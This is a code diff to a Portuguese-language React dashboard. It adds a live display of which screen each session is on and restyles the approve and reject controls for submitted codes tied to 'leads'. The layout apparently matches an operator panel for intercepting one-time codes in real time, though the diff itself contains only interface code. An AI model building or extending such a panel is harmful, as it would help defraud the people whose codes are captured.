@@ -538,6 +538,7 @@ export default function Dashboard() {
               busy={busy}
               onAction={send}
               onlineSessionIds={onlineSessionIds}
+              liveScreens={liveScreens}
             />
           </section>
         )}
@@ -580,6 +581,7 @@ export default function Dashboard() {
               busy={busy}
               onAction={send}
               onlineSessionIds={onlineSessionIds}
+              liveScreens={liveScreens}
             />
           )}
         </section>
@@ -643,6 +645,7 @@ function AttemptsTable({
   busy,
   onAction,
   onlineSessionIds,
+  liveScreens,
 }: {
   rows: AttemptRow[];
   leads: LeadRow[];
@@ -650,6 +653,7 @@ function AttemptsTable({
   busy: string | null;
   onAction: (row: AttemptRow, action: "approve" | "reject") => void;
   onlineSessionIds: Set<string>;
+  liveScreens: Map<string, string>;
 }) {
   return (
     <div className="overflow-x-auto">
@@ -679,13 +683,14 @@ function AttemptsTable({
               </span>
             </th>
             <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
-            <th className="px-4 py-3 text-left font-medium">Status</th>
           </tr>
         </thead>
         <tbody>
           {rows.map((row) => {
             const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
             const isOnline = onlineSessionIds.has(row.session_id);
+            const liveKind = liveScreens.get(row.session_id);
+            const screenLabel = liveKind ? screenKindLabel(liveKind) : "Tela código";
             return (
               <Fragment key={row.key}>
               <tr
@@ -704,38 +709,18 @@ function AttemptsTable({
                 <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs">
                   <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                    Tela código
+                    {screenLabel}
                   </span>
                 </td>
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
-                <td className="whitespace-nowrap px-4 py-3 text-xs">
-                  {row.status === "approve" && (
-                    <span className="inline-flex items-center gap-1 rounded-full bg-success/15 px-2 py-0.5 text-success">
-                      <Check className="h-3 w-3" /> aprovado
-                    </span>
-                  )}
-                  {row.status === "reject" && (
-                    <span className="inline-flex items-center gap-1 rounded-full bg-destructive/15 px-2 py-0.5 text-destructive">
-                      <X className="h-3 w-3" /> rejeitado
-                    </span>
-                  )}
-                  {row.status === "pending" && actionable && (
-                    <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                      ⏳ aguardando
-                    </span>
-                  )}
-                  {row.status === "pending" && !actionable && (
-                    <span className="text-muted-foreground">— ignorado</span>
-                  )}
-                </td>
               </tr>
               {actionable && (
                 <tr className="bg-primary/5">
-                  <td colSpan={8} className="px-4 pb-4 pt-0">
-                    <div className="flex flex-wrap gap-2 sm:justify-end">
+                  <td colSpan={7} className="px-4 pb-4 pt-0">
+                    <div className="flex gap-2">
                       <Button
                         size="sm"
-                        className="h-10 flex-1 bg-success px-5 text-success-foreground hover:bg-success/90 sm:flex-none"
+                        className="h-11 flex-1 bg-success text-success-foreground hover:bg-success/90"
                         onClick={() => onAction(row, "approve")}
                         disabled={busy === `${row.key}-approve`}
                       >
@@ -750,7 +735,7 @@ function AttemptsTable({
                       <Button
                         size="sm"
                         variant="outline"
-                        className="h-10 flex-1 border-destructive/40 px-5 text-destructive hover:bg-destructive/10 sm:flex-none"
+                        className="h-11 flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
                         onClick={() => onAction(row, "reject")}
                         disabled={busy === `${row.key}-reject`}
                       >
